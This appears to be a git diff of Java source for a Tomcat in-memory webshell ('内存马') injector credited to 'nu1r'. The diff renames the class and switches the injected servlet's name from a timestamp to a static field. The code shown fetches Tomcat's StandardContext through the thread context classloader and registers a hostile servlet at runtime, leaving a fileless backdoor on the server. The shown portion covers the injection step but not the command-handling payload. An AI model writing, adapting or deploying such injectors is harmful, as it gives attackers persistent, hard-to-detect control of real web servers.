@@ -9,17 +9,17 @@ import javax.servlet.*;
 import java.lang.reflect.Field;
 
 /**
- * 使用 Thread 注入 Tomcat Servlet 型内存马
+ * 使用线程注入 Tomcat Servlet 型内存马
  * @author nu1r
  */
-public class TSMSFromThreadS implements Servlet {
+public class TFMSFromThreadS implements Servlet {
 
     public static String pattern;
 
+    public static String NAME;
+
     static {
         try {
-            String servletName = String.valueOf(System.nanoTime());
-
             // 获取 standardContext
             WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
 
@@ -38,11 +38,11 @@ public class TSMSFromThreadS implements Servlet {
             }
 
 
-            if (standardContext.findChild(servletName) == null) {
+            if (standardContext.findChild(NAME) == null) {
                 Wrapper wrapper = standardContext.createWrapper();
-                wrapper.setName(servletName);
+                wrapper.setName(NAME);
                 standardContext.addChild(wrapper);
-                Servlet servlet = new TSMSFromThreadS();
+                Servlet servlet = new TFMSFromThreadS();
 
                 wrapper.setServletClass(servlet.getClass().getName());
                 wrapper.setServlet(servlet);
